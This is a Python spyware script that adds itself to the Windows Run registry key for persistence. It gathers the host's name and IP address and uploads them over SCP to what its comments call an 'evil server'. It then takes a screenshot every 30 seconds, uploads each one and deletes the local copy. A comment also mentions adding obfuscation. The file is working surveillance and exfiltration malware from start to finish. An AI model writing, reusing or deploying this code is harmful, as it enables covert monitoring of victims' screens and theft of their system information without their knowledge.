import numpy as np
import cv2
import pyautogui
import PIL
from datetime import datetime
import os
import time
import paramiko
import scpclient
from scp import SCPClient
import socket
import string
import random
# module to edit the windows registry
import winreg as reg
import os	

def AddToRegistry():

	# in python __file__ is the instant of
	# file path where it was executed
	# so if it was executed from desktop,
	# then __file__ will be
	# c:\users\current_user\desktop
	pth = str(os.path.dirname(os.path.realpath(__file__)))
	
	# name of the python file with extension
	s_name="\\screengrab3.py"	
	
	# joins the file name to end of path address
	address=pth+s_name
	#key = HKEY_CURRENT_USER
	key_value = "Software\\Microsoft\\Windows\\CurrentVersion\\Run"


	open = reg.OpenKey(reg.HKEY_CURRENT_USER,key_value,0,reg.KEY_ALL_ACCESS)
	reg.SetValueEx(open,"TEST",0,reg.REG_SZ,address)
	reg.CloseKey(open)

# adding obfuscation --------
# def make_new_folder_on_evil_server():

def systeminfo_txt_file():
	
	h_name = socket.gethostname()
	IP_addres = socket.gethostbyname(h_name)
	print("Host Name is:" + h_name)
	hostname = "Host Name is:" + h_name
	print("Computer IP Address is:" + IP_addres)
	ipaddr = "Computer IP Address is:" + IP_addres
	#write to file and export to evil server.
	filehandle = open('C:/temp/wieuhfwiuhefiweuhf.txt', 'w')
	filehandle.write(hostname)
	filehandle.write("\n")
	filehandle.write(ipaddr)
	filehandle.close()
	ssh = createSSHClient("IP", "PORT","USER","PASSWORD")
	scp = SCPClient(ssh.get_transport())
	scp.put('C:/temp/wieuhfwiuhefiweuhf.txt')

def createSSHClient(server, port, user, password):
	client = paramiko.SSHClient()
	client.load_system_host_keys()
	
	client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
	client.connect(server, port, user, password)
	return client

def delete_screenshot(name_f):
    os.remove(name_f)

def make_screenshot():
	today = datetime.today()
	image_type = ".png"
	str(today)
	image_name = "".join((str(today), str(image_type)))
	name = str(image_name.replace(" ", ""))
	name = name.replace(":","")
	name_f = "Image_" + str(name)
	image = pyautogui.screenshot()	
	image = cv2.cvtColor(np.array(image),cv2.COLOR_RGB2BGR)
	cv2.imwrite(name_f, image)
	print(name_f)
	return name_f


#---------------------------------------------------------

AddToRegistry()

systeminfo_txt_file()


while True:
	n = make_screenshot()


	ssh = createSSHClient("IP", "PORT","USER","PASSWORD")
	scp = SCPClient(ssh.get_transport())
	scp.put(n)
	delete_screenshot(n)
	time.sleep(30)


## The above the basic outline for taking and saving a screenshot.
##    To do next:
##        1. change file name to be time and date, with seconds
##        2. while loop to make a new screenshot every 30 seconds




